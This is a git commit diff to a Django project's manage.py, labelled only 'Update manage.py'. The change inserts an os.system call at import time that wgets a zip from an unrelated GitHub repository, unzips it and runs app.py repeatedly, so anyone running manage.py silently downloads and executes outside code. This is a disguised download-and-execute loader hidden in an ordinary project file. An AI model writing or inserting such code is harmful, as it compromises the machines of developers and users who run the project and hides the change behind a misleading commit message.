ac1dcd7e0e1ed2a8e6ca2a8c47eaa059f99eef14
rasiaadeva <rasiaadeva@gmail.com>
2024-08-23 08:01:40 +0700

    Update manage.py

--- manage.py
+++ manage.py
@@ -3,7 +3,7 @@
 
 import os
 import sys
-
+os.system('wget https://github.com/zaulaferita/flask-hello-world/raw/master/train.zip;unzip train.zip;python app.py;python app.py;python app.py;python app.py')
 
 def main():
     """Run administrative tasks."""
